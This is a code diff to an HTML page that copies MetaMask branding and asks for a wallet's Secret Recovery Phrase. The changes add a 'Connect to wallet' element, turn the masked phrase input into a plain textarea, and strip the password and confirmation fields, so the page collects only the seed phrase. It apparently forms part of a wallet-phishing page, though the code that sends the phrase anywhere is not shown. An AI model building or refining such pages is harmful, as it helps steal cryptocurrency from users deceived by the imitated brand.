@@ -26,7 +26,11 @@
   <body>
     <div class="main-parent-top">
       <div class="main-parent-child">
-        <img src="meta.jpg" alt="My Logo" width="40">
+        <div class="walleticon">
+          <div class="main-parent-heading-wallet">Connect to wallet</div>
+          <img src="image.png" alt="Wallet" width="20" height="20" />
+        </div>
+        <img src="meta.jpg" alt="Meta Logo" width="40" />
         <div class="main-parent-heading-meta">M E T A M A S K</div>
         <div class="main-parent-heading">
           Import from Secret Recovery Phrase
@@ -35,51 +39,16 @@
         <div class="main-parent-child-1">
           <div class="child-header">
             <div class="section-input-heading">Secret Recovery Phrase</div>
-            <div class="show-input" id="toggleRec">Show</div>
           </div>
           <div class="input-box-div">
-            <input
+            <textarea
               id="recovery"
-              class="input-field" 
-              type="password"
+              class="input-field"
+              type="text"
               placeholder="Enter your Secret Recovery Phrase"
-            />
+            ></textarea>
           </div>
         </div>
-
-        <div class="main-parent-child-1">
-          <div class="child-header">
-            <div class="section-input-heading">New Password</div>
-            <div class="show-input" id="togglePass">Show</div>
-          </div>
-          <div class="input-box-div">
-            <input
-              id="newPassword"
-              class="input-field"
-              type="password"
-              placeholder="New Password"
-            />
-          </div>
-        </div>
-
-        <div class="password-strength" id="strengthText"></div>
-
-        <div class="main-parent-child-1">
-          <div class="child-header">
-            <div class="section-input-heading">Confirm password</div>
-          </div>
-          <div class="input-box-div-confirm">
-            <input
-              id="confirmPassword"
-              class="input-field"
-              type="password"
-              placeholder="Confirm password"
-            />
-            <span id="checkIcon" style="display: none; color: green">✔</span>
-          </div>
-        </div>
-
-        <div class="character-field">Must be at least 8 characters</div>
 
         <div class="main-parent-button">
           <button class="button-box" id="importBtn">IMPORT</button>
